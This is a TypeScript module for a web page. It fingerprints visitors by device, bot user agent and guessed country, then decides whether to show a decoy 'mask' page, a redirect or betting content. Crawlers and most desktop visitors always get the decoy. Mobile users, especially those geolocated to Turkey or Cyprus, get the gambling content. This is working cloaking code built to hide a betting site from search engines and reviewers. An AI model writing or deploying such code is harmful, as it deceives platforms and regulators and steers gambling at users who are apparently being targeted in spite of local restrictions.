'use client';

export interface DeviceInfo {
    isMobile: boolean;
    isDesktop: boolean;
    isBot: boolean;
    country: string | null;
    userAgent: string;
}

export async function detectDevice(): Promise<DeviceInfo> {
    const userAgent = navigator.userAgent || '';

    // Bot detection
    const botPatterns = [
        /bot/i,
        /crawl/i,
        /spider/i,
        /google/i,
        /bing/i,
        /yahoo/i,
        /baidu/i,
        /yandex/i,
        /facebook/i,
        /twitter/i,
        /whatsapp/i,
        /telegram/i,
    ];

    const isBot = botPatterns.some(pattern => pattern.test(userAgent));

    // Mobile detection - Optimized for both real devices and browser resizing for testing
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)
        || window.innerWidth < 768 // Standard mobile breakpoint
        || (window.innerWidth < 1024 && (navigator.maxTouchPoints > 0 || 'ontouchstart' in window));

    const isDesktop = !isMobile;

    // Country detection
    let country: string | null = null;

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2500);

        // Try multiple IP geolocation services - added more for reliability in TR
        const responseData = await Promise.any([
            fetch('https://ipapi.co/json/', { signal: controller.signal }).then(res => res.json()),
            fetch('https://ip-api.com/json/', { signal: controller.signal }).then(res => res.json()),
            fetch('https://extreme-ip-lookup.com/json/', { signal: controller.signal }).then(res => res.json()),
            fetch('https://freegeoip.app/json/', { signal: controller.signal }).then(res => res.json())
        ]);

        clearTimeout(timeoutId);
        country = responseData.country_code || responseData.countryCode || responseData.country || null;
    } catch (error) {
        // Fallback to time zone detection (very effective for TR/CY)
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        if (tz.includes('Istanbul') || tz.includes('Turkey')) country = 'TR';
        if (tz.includes('Nicosia') || tz.includes('Cyprus')) country = 'CY';

        // Final fallback: browser language & common TR strings
        if (!country) {
            const lang = (navigator.language || '').toLowerCase();
            if (lang.includes('tr')) country = 'TR';
            else if (lang.includes('el-cy') || lang.includes('tr-cy')) country = 'CY';

            // Even deeper check: Date locale
            const dateStr = new Date().toLocaleString();
            if (dateStr.includes('.') && dateStr.includes(':')) { // Typical TR format check
                if (navigator.languages?.some(l => l.toLowerCase().includes('tr'))) country = 'TR';
            }
        }
    }

    return {
        isMobile,
        isDesktop,
        isBot,
        country: country?.toUpperCase() || null,
        userAgent,
    };
}

export function determineDisplayType(deviceInfo: DeviceInfo, rules: any): 'mask' | 'betting' | 'redirect' {
    // 1. Bots always see mask
    if (deviceInfo.isBot) return 'mask';

    // 2. Desktop users check
    if (deviceInfo.isDesktop) {
        if (rules?.redirectMaskTo && rules.redirectMaskTo.trim() !== '') {
            return 'redirect';
        }
        return 'mask';
    }

    // 3. Mobile Check
    if (deviceInfo.isMobile) {
        const showBetting = rules?.showBettingTo || {};

        // If showBetting.mobile is not explicitly true, show mask
        if (showBetting.mobile === false) return 'mask';

        const isLocal = typeof window !== 'undefined' &&
            (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1');

        // Check if current country is allowed.
        const includedCountries = showBetting.includedCountries || [];
        const hasCountryFilter = includedCountries.length > 0;

        const isAllowedCountry = !hasCountryFilter ||
            (deviceInfo.country && includedCountries.includes(deviceInfo.country)) ||
            isLocal;

        // If country is detected as TR or CY, we should be VERY lenient
        const isTurkishRegions = deviceInfo.country === 'TR' || deviceInfo.country === 'CY';

        if (isAllowedCountry || isTurkishRegions) {
            return 'betting';
        }
    }

    // Default to mask for safety
    return 'mask';
}
